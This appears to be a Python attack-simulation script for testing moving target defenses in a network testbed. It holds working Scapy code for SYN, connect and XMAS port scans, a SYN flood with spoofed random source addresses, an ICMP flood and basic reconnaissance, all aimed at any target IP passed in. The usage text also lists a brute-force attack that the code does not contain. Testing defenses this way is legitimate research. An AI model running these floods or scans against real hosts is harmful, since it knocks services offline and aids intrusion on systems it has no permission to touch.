#!/usr/bin/env python3
"""
MTD ATTACK SIMULATION SUITE
Comprehensive attack scenarios for testing MTD effectiveness

USAGE:
    python attack_simulator.py --attack <attack_type> --target <ip>
    
Available attacks:
    - port_scan: Simulates Nmap-style port scanning
    - syn_flood: TCP SYN flood DDoS attack
    - ping_flood: ICMP flood attack
    - reconnaissance: Network mapping
    - brute_force: Login attempt simulation
    - all: Run all attack scenarios

REQUIREMENTS:
    pip install scapy argparse rich
"""

from scapy.all import *
import argparse
import time
import random
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel

console = Console()


class AttackSimulator:
    """Comprehensive attack simulator for MTD testing"""
    
    def __init__(self, target_ip, interface='h1-eth0', verbose=True):
        self.target_ip = target_ip
        self.interface = interface
        self.verbose = verbose
        self.results = {
            'attack_type': None,
            'start_time': None,
            'end_time': None,
            'packets_sent': 0,
            'responses_received': 0,
            'ports_discovered': [],
            'success_rate': 0.0,
            'detection_triggered': False
        }
    
    def _log(self, message, style="white"):
        """Log message if verbose"""
        if self.verbose:
            console.print(f"[{style}]{message}[/{style}]")
    
    def _save_results(self, filename="attack_results.json"):
        """Save attack results to file"""
        import json
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"attack_{self.results['attack_type']}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        self._log(f"Results saved to {filename}", "green")
    
    def port_scan(self, ports=None, scan_type='syn', delay=0.1):
        """
        Simulate port scanning attack
        
        Args:
            ports: List of ports to scan (default: common ports)
            scan_type: 'syn', 'connect', or 'xmas'
            delay: Delay between scans in seconds
        """
        if ports is None:
            # Common ports
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 
                    443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        self.results['attack_type'] = f'port_scan_{scan_type}'
        self.results['start_time'] = datetime.now().isoformat()
        
        console.print(Panel(
            f"[bold red]PORT SCAN ATTACK[/bold red]\n"
            f"Target: {self.target_ip}\n"
            f"Ports: {len(ports)}\n"
            f"Type: {scan_type.upper()}",
            border_style="red"
        ))
        
        open_ports = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            task = progress.add_task(f"Scanning {len(ports)} ports...", total=len(ports))
            
            for port in ports:
                self.results['packets_sent'] += 1
                
                try:
                    if scan_type == 'syn':
                        # SYN scan
                        pkt = IP(dst=self.target_ip)/TCP(dport=port, flags='S')
                        response = sr1(pkt, timeout=1, verbose=0)
                        
                        if response and response.haslayer(TCP):
                            if response[TCP].flags == 0x12:  # SYN-ACK
                                open_ports.append(port)
                                self.results['responses_received'] += 1
                                self._log(f"Port {port}: OPEN", "green")
                                # Send RST to close connection
                                rst = IP(dst=self.target_ip)/TCP(dport=port, flags='R')
                                send(rst, verbose=0)
                            elif response[TCP].flags == 0x14:  # RST-ACK
                                self._log(f"Port {port}: CLOSED", "red")
                    
                    elif scan_type == 'connect':
                        # TCP Connect scan
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((self.target_ip, port))
                        sock.close()
                        
                        if result == 0:
                            open_ports.append(port)
                            self.results['responses_received'] += 1
                            self._log(f"Port {port}: OPEN", "green")
                    
                    elif scan_type == 'xmas':
                        # XMAS scan (FIN, PSH, URG)
                        pkt = IP(dst=self.target_ip)/TCP(dport=port, flags='FPU')
                        response = sr1(pkt, timeout=1, verbose=0)
                        
                        if response is None:
                            open_ports.append(port)
                            self._log(f"Port {port}: OPEN/FILTERED", "yellow")
                
                except Exception as e:
                    self._log(f"Error scanning port {port}: {str(e)}", "red")
                
                progress.update(task, advance=1)
                time.sleep(delay)
        
        self.results['end_time'] = datetime.now().isoformat()
        self.results['ports_discovered'] = open_ports
        self.results['success_rate'] = len(open_ports) / len(ports) * 100
        
        # Display results
        self._display_port_scan_results(open_ports, ports)
        self._save_results()
    
    def _display_port_scan_results(self, open_ports, all_ports):
        """Display port scan results"""
        table = Table(title="[bold red]Port Scan Results[/bold red]", show_header=True)
        table.add_column("Metric", style="cyan", width=30)
        table.add_column("Value", style="white", width=20)
        
        table.add_row("Total Ports Scanned", str(len(all_ports)))
        table.add_row("Open Ports Found", str(len(open_ports)))
        table.add_row("Success Rate", f"{self.results['success_rate']:.2f}%")
        table.add_row("Packets Sent", str(self.results['packets_sent']))
        table.add_row("Responses Received", str(self.results['responses_received']))
        
        console.print("\n")
        console.print(table)
        
        if open_ports:
            console.print(f"\n[green]Open Ports:[/green] {', '.join(map(str, open_ports))}")
    
    def syn_flood(self, duration=10, rate=100, target_port=80):
        """
        Simulate SYN flood DDoS attack
        
        Args:
            duration: Attack duration in seconds
            rate: Packets per second
            target_port: Target port number
        """
        self.results['attack_type'] = 'syn_flood'
        self.results['start_time'] = datetime.now().isoformat()
        
        console.print(Panel(
            f"[bold red]SYN FLOOD ATTACK[/bold red]\n"
            f"Target: {self.target_ip}:{target_port}\n"
            f"Duration: {duration}s\n"
            f"Rate: {rate} pps",
            border_style="red"
        ))
        
        start_time = time.time()
        packets_sent = 0
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            task = progress.add_task(f"Flooding for {duration}s...", total=duration)
            
            while time.time() - start_time < duration:
                # Random source IP and port
                src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                pkt = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=target_port, flags='S')
                
                send(pkt, verbose=0)
                packets_sent += 1
                self.results['packets_sent'] += 1
                
                # Control rate
                time.sleep(1.0 / rate)
                
                progress.update(task, completed=time.time() - start_time)
        
        self.results['end_time'] = datetime.now().isoformat()
        
        # Display results
        table = Table(title="[bold red]SYN Flood Results[/bold red]")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Duration", f"{duration}s")
        table.add_row("Packets Sent", str(packets_sent))
        table.add_row("Average Rate", f"{packets_sent/duration:.2f} pps")
        
        console.print("\n")
        console.print(table)
        self._save_results()
    
    def ping_flood(self, duration=10, rate=50, payload_size=56):
        """
        Simulate ICMP flood attack
        
        Args:
            duration: Attack duration in seconds
            rate: Packets per second
            payload_size: ICMP payload size in bytes
        """
        self.results['attack_type'] = 'ping_flood'
        self.results['start_time'] = datetime.now().isoformat()
        
        console.print(Panel(
            f"[bold red]PING FLOOD ATTACK[/bold red]\n"
            f"Target: {self.target_ip}\n"
            f"Duration: {duration}s\n"
            f"Rate: {rate} pps\n"
            f"Payload: {payload_size} bytes",
            border_style="red"
        ))
        
        start_time = time.time()
        packets_sent = 0
        responses = 0
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            task = progress.add_task(f"Flooding for {duration}s...", total=duration)
            
            while time.time() - start_time < duration:
                # Create ICMP packet with payload
                payload = "A" * payload_size
                pkt = IP(dst=self.target_ip)/ICMP()/payload
                
                # Send and check for response
                response = sr1(pkt, timeout=0.1, verbose=0)
                packets_sent += 1
                self.results['packets_sent'] += 1
                
                if response:
                    responses += 1
                    self.results['responses_received'] += 1
                
                time.sleep(1.0 / rate)
                progress.update(task, completed=time.time() - start_time)
        
        self.results['end_time'] = datetime.now().isoformat()
        self.results['success_rate'] = (responses / packets_sent * 100) if packets_sent > 0 else 0
        
        # Display results
        table = Table(title="[bold red]Ping Flood Results[/bold red]")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Duration", f"{duration}s")
        table.add_row("Packets Sent", str(packets_sent))
        table.add_row("Responses Received", str(responses))
        table.add_row("Response Rate", f"{self.results['success_rate']:.2f}%")
        table.add_row("Average Rate", f"{packets_sent/duration:.2f} pps")
        
        console.print("\n")
        console.print(table)
        self._save_results()
    
    def reconnaissance(self, techniques=['ping_sweep', 'os_detection', 'service_enum']):
        """
        Simulate network reconnaissance
        
        Args:
            techniques: List of recon techniques to use
        """
        self.results['attack_type'] = 'reconnaissance'
        self.results['start_time'] = datetime.now().isoformat()
        
        console.print(Panel(
            f"[bold red]NETWORK RECONNAISSANCE[/bold red]\n"
            f"Target: {self.target_ip}\n"
            f"Techniques: {', '.join(techniques)}",
            border_style="red"
        ))
        
        discovered_info = {}
        
        # Ping sweep
        if 'ping_sweep' in techniques:
            self._log("Performing ping sweep...", "yellow")
            pkt = IP(dst=self.target_ip)/ICMP()
            response = sr1(pkt, timeout=2, verbose=0)
            
            if response:
                discovered_info['host_alive'] = True
                discovered_info['ttl'] = response.ttl
                self._log(f"Host is alive (TTL: {response.ttl})", "green")
            else:
                discovered_info['host_alive'] = False
                self._log("Host appears down or filtered", "red")
        
        # OS detection (basic)
        if 'os_detection' in techniques:
            self._log("Attempting OS detection...", "yellow")
            # Simple TTL-based OS fingerprinting
            if 'ttl' in discovered_info:
                ttl = discovered_info['ttl']
                if ttl <= 64:
                    discovered_info['os_guess'] = 'Linux/Unix'
                elif ttl <= 128:
                    discovered_info['os_guess'] = 'Windows'
                else:
                    discovered_info['os_guess'] = 'Cisco/Network Device'
                self._log(f"OS Guess: {discovered_info['os_guess']}", "green")
        
        # Service enumeration
        if 'service_enum' in techniques:
            self._log("Enumerating services...", "yellow")
            common_ports = [22, 80, 443, 3306, 5432, 8080]
            services = []
            
            for port in common_ports:
                pkt = IP(dst=self.target_ip)/TCP(dport=port, flags='S')
                response = sr1(pkt, timeout=1, verbose=0)
                
                if response and response.haslayer(TCP) and response[TCP].flags == 0x12:
                    services.append(port)
                    self._log(f"Service found on port {port}", "green")
            
            discovered_info['services'] = services
        
        self.results['end_time'] = datetime.now().isoformat()
        self.results['discovered_info'] = discovered_info
        
        # Display results
        table = Table(title="[bold red]Reconnaissance Results[/bold red]")
        table.add_column("Information", style="cyan", width=20)
        table.add_column("Value", style="white", width=40)
        
        for key, value in discovered_info.items():
            table.add_row(str(key).replace('_', ' ').title(), str(value))
        
        console.print("\n")
        console.print(table)
        self._save_results()
    
    def run_all_attacks(self):
        """Run all attack scenarios"""
        console.print("[bold red]Running Complete Attack Suite[/bold red]\n")
        
        # 1. Reconnaissance
        console.print("\n[yellow]═══ Phase 1: Reconnaissance ═══[/yellow]")
        self.reconnaissance()
        time.sleep(2)
        
        # 2. Port Scan
        console.print("\n[yellow]═══ Phase 2: Port Scanning ═══[/yellow]")
        self.port_scan(ports=list(range(1, 101)), delay=0.05)
        time.sleep(2)
        
        # 3. Ping Flood (short duration for testing)
        console.print("\n[yellow]═══ Phase 3: Ping Flood ═══[/yellow]")
        self.ping_flood(duration=5, rate=50)
        time.sleep(2)
        
        # 4. SYN Flood (short duration for testing)
        console.print("\n[yellow]═══ Phase 4: SYN Flood ═══[/yellow]")
        self.syn_flood(duration=5, rate=50)
        
        console.print("\n[bold green]✓ Attack suite completed![/bold green]")


def main():
    parser = argparse.ArgumentParser(description='MTD Attack Simulation Suite')
    parser.add_argument('--attack', type=str, required=True,
                       choices=['port_scan', 'syn_flood', 'ping_flood', 'reconnaissance', 'all'],
                       help='Type of attack to simulate')
    parser.add_argument('--target', type=str, required=True,
                       help='Target IP address')
    parser.add_argument('--interface', type=str, default='h1-eth0',
                       help='Network interface to use')
    parser.add_argument('--duration', type=int, default=10,
                       help='Attack duration in seconds (for flood attacks)')
    parser.add_argument('--rate', type=int, default=100,
                       help='Packets per second (for flood attacks)')
    parser.add_argument('--ports', type=str, default=None,
                       help='Comma-separated list of ports for port scan')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(args.target, args.interface, args.verbose)
    
    if args.attack == 'port_scan':
        ports = None
        if args.ports:
            ports = [int(p) for p in args.ports.split(',')]
        simulator.port_scan(ports=ports)
    
    elif args.attack == 'syn_flood':
        simulator.syn_flood(duration=args.duration, rate=args.rate)
    
    elif args.attack == 'ping_flood':
        simulator.ping_flood(duration=args.duration, rate=args.rate)
    
    elif args.attack == 'reconnaissance':
        simulator.reconnaissance()
    
    elif args.attack == 'all':
        simulator.run_all_attacks()


if __name__ == '__main__':
    main()